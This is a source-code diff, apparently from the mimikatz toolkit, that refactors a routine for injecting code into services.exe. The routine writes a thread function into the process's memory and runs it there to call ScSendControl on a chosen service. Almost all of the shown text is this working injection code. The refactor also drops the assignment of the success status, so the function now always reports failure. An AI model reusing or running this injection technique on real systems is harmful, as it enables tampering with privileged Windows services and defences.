@@ -24,10 +24,9 @@ KULL_M_PATCH_GENERIC ScSendControlReferences[] = {
 #endif
 
 #pragma optimize("", off)
-DWORD WINAPI kuhl_service_sendcontrol_thread(PREMOTE_LIB_FUNC lpParameter)
+DWORD WINAPI kuhl_service_sendcontrol_thread(PREMOTE_LIB_DATA lpParameter)
 {
-	PKUHL_M_SERVICE_FORCE_INPUT pInput = (PKUHL_M_SERVICE_FORCE_INPUT) lpParameter->inputData;
-	lpParameter->outputSize = pInput->pScSendControl ? pInput->pScSendControl(pInput->ServiceName, 0, 0, 0, pInput->dwControl, 0, 0, 0, 0, 0, 0, 0, 0, 0) : 0xffffffff;
+	lpParameter->output.outputStatus = ((PSCSENDCONTROL) lpParameter->input.inputVoid)((LPCWSTR) lpParameter->input.inputData, 0, 0, 0, lpParameter->input.inputDword, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 	return STATUS_SUCCESS;
 }
 DWORD kuhl_service_sendcontrol_thread_end(){return 'svcc';}
@@ -36,16 +35,17 @@ DWORD kuhl_service_sendcontrol_thread_end(){return 'svcc';}
 BOOL kuhl_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl)
 {
 	BOOL status = FALSE;
-	DWORD szServiceName, processId, szInput, szOutput;
+	DWORD processId;
 	HANDLE hProcess;
 	KULL_M_MEMORY_ADDRESS aRemoteFunc;
-	PKUHL_M_SERVICE_FORCE_INPUT pInput;
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory};
 	KULL_M_MEMORY_SEARCH sMemory;
 	PKULL_M_PATCH_GENERIC currentReference;
 	PEB Peb;
 	PIMAGE_NT_HEADERS pNtHeaders;
+	PREMOTE_LIB_INPUT_DATA iData;
+	REMOTE_LIB_OUTPUT_DATA oData;
 
 	if(kull_m_process_getProcessIdForName(L"services.exe", &processId))
 	{
@@ -78,23 +78,17 @@ BOOL kuhl_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl)
 				{
 					if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory, kuhl_service_sendcontrol_thread, (DWORD) ((PBYTE) kuhl_service_sendcontrol_thread_end - (PBYTE) kuhl_service_sendcontrol_thread), NULL, &aRemoteFunc))
 					{
-						szServiceName = (DWORD) (wcslen(ServiceName) + 1) * sizeof(wchar_t);
-						szInput = FIELD_OFFSET(KUHL_M_SERVICE_FORCE_INPUT, ServiceName) + szServiceName;
-						if(pInput = (PKUHL_M_SERVICE_FORCE_INPUT) LocalAlloc(LPTR, szInput))
+						if(iData = kull_m_remotelib_CreateInput(pScSendControl, dwControl, (DWORD) (wcslen(ServiceName) + 1) * sizeof(wchar_t), ServiceName))
 						{
-							pInput->pScSendControl = pScSendControl;
-							pInput->dwControl = dwControl;
-							RtlCopyMemory(pInput->ServiceName, ServiceName, szServiceName);
-							kprintf(L"code %u : ", pInput->dwControl);
-							if(kull_m_remotelib_create(&aRemoteFunc, pInput, szInput, NULL, &szOutput, FALSE))
+							if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
 							{
-								if(status = !szOutput)
-									kprintf(L"OK!\n");
+								if(oData.outputStatus)
+									kprintf(L"error %u\n", oData.outputStatus);
 								else
-									kprintf(L"error %u\n",szOutput);
+									kprintf(L"OK!\n");
 							}
 							else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
-							LocalFree(pInput);
+							LocalFree(iData);
 						}
 						kull_m_memory_free(&aRemoteFunc, 0);
 					}
@@ -107,6 +101,5 @@ BOOL kuhl_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl)
 		}
 		else PRINT_ERROR_AUTO(L"OpenProcess");
 	}
-
 	return status;
 }
